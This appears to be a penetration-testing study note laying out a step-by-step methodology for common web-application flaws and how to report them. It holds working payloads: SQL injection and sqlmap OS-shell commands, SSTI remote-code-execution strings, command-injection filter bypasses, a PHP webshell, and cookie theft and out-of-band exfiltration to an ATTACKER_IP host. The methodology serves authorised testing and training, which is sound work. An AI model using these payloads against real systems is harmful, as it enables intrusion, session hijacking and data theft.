Up::
Reference::
Tags:: #AppSec/WebApp/Methodology #AppSec/OSWA
Date:: 2026-06-02

---

### SQL Injection

**Step 1: Find the injection point.** Test every parameter that interacts with a database — GET params, POST body, cookies, headers (User-Agent, Referer, X-Forwarded-For). Inject a single quote (`'`). If you get a 500 error or different response, you've found your injection point. Inject a second quote (`''`) — if normal response returns, you're in a string context. Test numeric context with `AND 1=1` vs `AND 1=2`. If responses differ, it's numeric. Read the error messages: MySQL says `near '...`, MSSQL says `Incorrect syntax`, PostgreSQL says `ERROR:`, Oracle prefixes with `ORA-`.

**Step 2: Identify the DBMS.**
```sql
' AND 'foo' 'bar' = 'foobar        -- MySQL (space concatenation)
' OR 1=CAST((@@version) AS INT)--  -- MSSQL/PostgreSQL error-based
' WAITFOR DELAY '0:0:5' --         -- MSSQL time delay
' AND 1=1 --                        -- Oracle compatible
```
Or just run sqlmap once — it fingerprints automatically.

**Step 3: Choose your path.** Error-based (errors visible) — use CAST/ExtractValue/dbms_xmlgen payloads. Fastest. UNION-based (data reflected on page) — find column count with `ORDER BY n` or `UNION SELECT null,...`, find string column position, dump data. Blind (no visible output) — use sqlmap with `--technique=B` or `--technique=T`. Don't manually enumerate unless sqlmap fails.

**Step 4: Extract data.** Enumerate databases → tables → columns → dump target table. Check file privileges: MySQL `LOAD_FILE`, PostgreSQL `pg_read_file`, MSSQL `xp_cmdshell`. If stacked queries available, attempt RCE — `xp_cmdshell` for MSSQL, `COPY` for PostgreSQL, `INTO OUTFILE` for MySQL.

**Step 5: Use sqlmap when manual is too slow.**
```bash
sqlmap -u "URL" --batch --level=3                         # Start here
sqlmap -u "URL" --cookie="PHPSESSID=xxx" --batch --dump   # Authenticated
sqlmap -r request.txt --batch --dump                      # From Caido/Burp
sqlmap -u "URL" --technique=U --dump                      # UNION only (fastest)
sqlmap -u "URL" --technique=B --dump                      # Boolean blind
sqlmap -u "URL" --technique=T --time-sec=2                # Time-based
sqlmap -u "URL" --os-shell                                # OS shell (needs webroot write)
sqlmap -u "URL" --level=5 --risk=3 --threads=3 --batch   # Aggressive
```

**Step 6: Document.** Injection point, DBMS type, extraction method, data recovered, any RCE achieved.

---

### Cross-Site Scripting (XSS)

**Step 1: Find injection points.** Every user input that appears in the response: search boxes, comment fields, profile names, URLs, file names, error messages. Check where the input lands — HTML body, attribute value, JavaScript block, or CSS context. Test with `<h1>test</h1>` — if HTML renders, injection confirmed. Test with `<img src=x onerror=alert(1)>` — if alert fires, XSS confirmed.

**Step 2: Identify the context.**

| Where input appears | Exploitation |
|---------------------|-------------|
| Between HTML tags | `<script>`, `<img onerror>`, `<svg onload>` |
| Inside tag attribute | Break out with `">` then inject tag |
| Inside JavaScript string | `';alert(1)//` or `</script><img src=x onerror=alert(1)>` |
| Inside JS template literal | `${alert(1)}` |
| Inside URL (href/src) | `javascript:alert(1)` |
| DOM-based (client JS) | Find the sink: `innerHTML`, `document.write`, `eval` |

**Step 3: Bypass filters.** `<script>` blocked → `<img src=x onerror=...>`, `<svg onload=...>`, `<body onload=...>`. `alert` blocked → `confirm`, `prompt`, `fetch`, `eval(atob('...'))`. Spaces stripped → `/` between attributes: `<img/src=x/onerror=alert(1)>`. Angle brackets encoded → could be DOM XSS, check `innerHTML`. Event handlers blocked → CSS injection: `<style>@import url(http://ATTACKER/exfil)</style>`. Both blocked → dangling markup: `<a href='http://ATTACKER/?`.

**Step 4: Exploit for impact.** Reflected XSS: send crafted link, steal session cookie. Stored XSS: inject payload, fires for every visitor. DOM XSS: check if attacker controls the source (URL hash, postMessage). Set up listener: `nc -nvlp 80` then `fetch('http://ATTACKER_IP/?c='+document.cookie)`.

**Step 5: Document.** Injection point, context, filter bypass used, impact demonstrated.

---

### Server-Side Template Injection (SSTI)

**Step 1: Detect the engine.** Inject `${{7*7}}` in every user-controlled field. If output is `49`, SSTI confirmed. Fingerprint: `{{7*'7'}}` → `7777777` = Jinja2 (Python), `{{7*'7'}}` → `49` = Twig (PHP), `${7*7}` → `49` = Freemarker (Java), `#{7*7}` → `49` = Pug (NodeJS).

**Step 2: Read configuration (Jinja2/Flask first).**
```python
{{config}}                              # Flask config dump
{{config|pprint}}                       # Pretty-printed
```
Look for `SECRET_KEY`, database credentials, API keys, `DEBUG` flag. Also try `{{request}}`, `{{session}}`, `{{self.__init__.__globals__}}`.

**Step 3: Achieve RCE.**

Jinja2 (Python):
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

Twig (PHP):
```twig
{{[0]|reduce('system','whoami')}}
{{['id']|filter('system')}}
```

Freemarker (Java):
```java
${"freemarker.template.utility.Execute"?new()("whoami")}
```

Pug (NodeJS):
```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```

**Step 4: If RCE fails.** Try blind/OOB: `curl http://ATTACKER_IP/$(whoami)` or engine equivalent. Enumerate objects: `{{self}}`, `{{self.__dict__}}`, `{{''.__class__.__mro__}}`. In Jinja2, try `{{lipsum}}` — if available, RCE is likely possible.

**Step 5: Document.** Engine type, detection payload, RCE payload, data exfiltrated.

---

### Command Injection

**Step 1: Find injection points.** Any parameter used in a system command: ping forms, DNS lookup, file conversion, image processing, backup scripts. Test: inject `;id` or `|whoami` after normal input. Blind detection: `;sleep 5` — if page takes 5+ seconds, confirmed.

**Step 2: Test all operators.** `;` (semicolon), `|` (pipe), `||` (OR), `&&` (AND), backticks, `$()` (command substitution), newline (`%0a`).

**Step 3: Bypass filters.** Command blocked → insert null chars: `wh$()oami`, `who$()ami`. Spaces stripped → `${IFS}`: `cat${IFS}/etc/passwd` or tabs `%09`. Slashes blocked → `${HOME:0:1}` for `/`. Multiple filters → base64: `` `echo "Y2F0..."|base64 -d` ``. Quotes blocked → `$()` instead of backticks, or vice versa.

**Step 4: Get a shell.** Determine OS: `;uname -a` or `;ver`. Check tools: `;which nc python3 php perl`. Use appropriate reverse shell. Outbound blocked? Write webshell: `echo "<?php system($_GET['cmd']);?>" > /var/www/html/s.php`. Nothing works? Use `curl`/`wget` to exfiltrate data to your server.

**Step 5: Document.** Injection point, operator, OS, shell obtained, filter bypass.

---

### Server-Side Request Forgery (SSRF)

**Step 1: Find SSRF vectors.** URL import features, file upload from URL, API integrations accepting URLs, PDF/image generators, web proxies, URL preview features.

**Step 2: Confirm internal access.** Try localhost: `http://127.0.0.1`, `http://localhost`, `http://0.0.0.0`. Probe ports: `:80`, `:8080`, `:3000`, `:5000`, `:22`. Filtered? IP obfuscation: `http://127.1/`, `http://0x7f000001/`, `http://2130706433/`, `http://[::1]/`.

**Step 3: Map what's reachable.** Internal services on the same host. Other hosts on the internal network. Cloud metadata: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP).

**Step 4: Escalate.** `file://` allowed → read local files. `gopher://` allowed → inject raw HTTP to internal services. Internal API found → chain with IDOR/SQLi. Cloud metadata → extract IAM credentials, SSH keys.

**Step 5: Document.** Vulnerable parameter, internal target, data accessed, credentials extracted.

---

### Directory Traversal / LFI

**Step 1: Identify file parameters.** Look for `file`, `path`, `page`, `download`, `template`, `include`, `document`. Test: `../../../../etc/passwd` (Linux) or `..\..\..\..\windows\win.ini` (Windows).

**Step 2: Confirm and enumerate.** `/etc/passwd` returns → LFI confirmed. PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`. Log poisoning: inject PHP into User-Agent → access log → RCE. `/proc/self/environ` (CGI) → environment variables. `/proc/self/cmdline` → running command.

**Step 3: Escalate to RCE.** PHP wrappers: read source → find file upload. Log poisoning: `<?php system($_GET['cmd']);?>` in User-Agent → access via LFI. PHP expect: `expect://id` (rare). PHP input: `php://input` with POST PHP code. `/proc/self/fd`: enumerate file descriptors.

Fuzzing:
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 \
  "http://TARGET/page.php?file=../../../../../../../../FUZZ"
wfuzz -w paths.txt -w files.txt --hh 0 \
  "http://TARGET/page.php?file=FUZZFUZ2Z"
```

**Step 4: Document.** Vulnerable parameter, file read confirmed, source code recovered, RCE achieved.

---

### XML External Entities (XXE)

**Step 1: Identify XML parsers.** SOAP APIs, XML file upload, SAML auth. Check `Content-Type: application/xml`. Send basic XML — if parsed and reflected, test further.

**Step 2: Test in-band.** Define entity: `<!ENTITY test "XXE_TEST">`. If `XXE_TEST` appears → confirmed. File read: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`. If content appears → in-band XXE. Windows: `file:///c:/windows/win.ini`.

**Step 3: Test out-of-band.** Entity to your server: `<!ENTITY xxe SYSTEM "http://ATTACKER_IP/test">`. Listener: `nc -nvlp 80`. Connection received → OOB XXE confirmed. Escalate with external DTD for file exfiltration.

**Step 4: Escalate.** Config files → credentials → further access. SSRF via XXE: `http://` entity to probe internal network. PHP `expect://` → `expect://id` for RCE.

**Step 5: Document.** Injection point, in-band vs OOB, files read, credentials recovered.

---

### Insecure Direct Object Reference (IDOR)

**Step 1: Find predictable identifiers.** Numeric IDs: `/user/profile/3`, `/document/145`, `/order?id=882`. Sequential patterns. Encoded IDs → decode (base64, hex) → test.

**Step 2: Test authorization.** Access your resource, note ID. Change ID → someone else's data? IDOR confirmed. Test unauthenticated — some work without login.

**Step 3: Brute force.** Determine ID range. Use wfuzz. Test 10-15 IDs to confirm pattern, then stop. Use your session cookies.

**Step 4: Check different object types.** User profiles → PII. Documents → private files. Orders → financial data. Admin functions → privilege escalation.

**Step 5: Document.** Vulnerable endpoint, ID pattern, data accessed, impact.

---

### Cross-Site Request Forgery (CSRF)

**Step 1: Identify state-changing actions.** POST requests: password change, email update, fund transfer. Check for CSRF tokens. Check cookie `SameSite` — missing = Lax (Chrome), `None` = vulnerable.

**Step 2: Test without tokens.** Copy request from Caido Replay. Remove CSRF token parameters. Replay — succeeds? CSRF confirmed. Try changing `Origin`/`Referer` header.

**Step 3: Build the exploit.** HTML form auto-submit to vulnerable endpoint. Host on attacker server. Test victim action.

**Step 4: Document.** Vulnerable endpoint, missing protection, exploit payload, impact.

---

### Reporting

Each finding needs:

**Title:** `[SEVERITY] Vulnerability Type on Component`

**Description:** 2-3 sentences on what the vulnerability is.

**Impact:** What an attacker can do. Be specific — "Access all user PII including names, emails, and password hashes" not "Data exposure."

**Steps to Reproduce:** Numbered list anyone can follow.

**Proof of Concept:** Screenshot of exploit success. Request/response in appendix.

**Remediation:** Specific fix tied to the technology. "Replace string concatenation in search.php line 47 with PDO prepared statements" not "Use parameterized queries."
